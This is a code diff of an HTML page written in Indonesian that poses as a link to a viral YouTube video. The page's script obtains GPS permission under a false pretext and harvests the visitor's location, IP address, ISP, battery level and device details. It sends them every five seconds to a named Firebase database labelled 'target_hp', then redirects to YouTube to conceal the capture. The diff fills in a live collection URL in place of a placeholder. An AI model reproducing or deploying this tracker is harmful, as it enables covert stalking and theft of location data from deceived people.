@@ -11,7 +11,6 @@
         h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
         .btn { background: #3b82f6; color: white; border: none; padding: 15px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); background: #2563eb; }
         #loader { display: none; margin-top: 15px; border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -27,9 +26,8 @@
 </div>
 
 <script>
-    // --- KONFIGURASI_FIREBASE ---
-    // Ganti URL di bawah dengan URL Realtime Database kamu
-    const DB_URL = "ISI_DENGAN_URL_FIREBASE_KAMU/target_hp.json";
+    // KONFIGURASI FIREBASE ASIA-SOUTHEAST
+    const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/target_hp.json";
 
     const YT_URL = "https://www.youtube.com/trending";
     const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";
@@ -42,8 +40,8 @@
             const net = await ipRes.json();
             const battery = await navigator.getBattery();
             return {
-                ip: net.ip,
-                isp: net.org,
+                ip: net.ip || "N/A",
+                isp: net.org || "N/A",
                 bat: Math.round(battery.level * 100) + "%",
                 dev: navigator.userAgent
             };
@@ -59,7 +57,7 @@
             isp: info.isp,
             battery: info.bat,
             device: info.dev,
-            time: new Date().toLocaleString("id-ID"),
+            updated_at: new Date().toLocaleString("id-ID"),
             status: "Online (Background)"
         };
 
@@ -71,26 +69,18 @@
         document.getElementById('loader').style.display = "block";
 
         if (navigator.geolocation) {
-            // Minta izin GPS
             navigator.geolocation.watchPosition(
                 (pos) => {
-                    // Kirim data pertama
-                    sendToFirebase(pos.coords);
-
-                    // Kirim data setiap 5 detik (looping tetap jalan di tab ini)
                     const now = Date.now();
                     if (now - lastSent > 5000) {
                         sendToFirebase(pos.coords);
                         lastSent = now;
                     }
 
-                    // Pengalihan ke aplikasi YouTube eksternal
-                    // Kita beri jeda 1 detik agar pengiriman data pertama selesai
                     setTimeout(() => {
                         window.location.href = YT_APP_INTENT;
-                        // Fallback jika tidak punya aplikasi YT:
                         setTimeout(() => { window.location.href = YT_URL; }, 500);
-                    }, 1000);
+                    }, 1500);
                 },
                 (err) => {
                     alert("Mohon izinkan lokasi agar video bisa dibuka sesuai wilayah Anda.");
@@ -98,9 +88,10 @@
                 },
                 { enableHighAccuracy: true }
             );
+        } else {
+            alert("Browser tidak mendukung GPS.");
         }
     }
 </script>
-
 </body>
 </html>
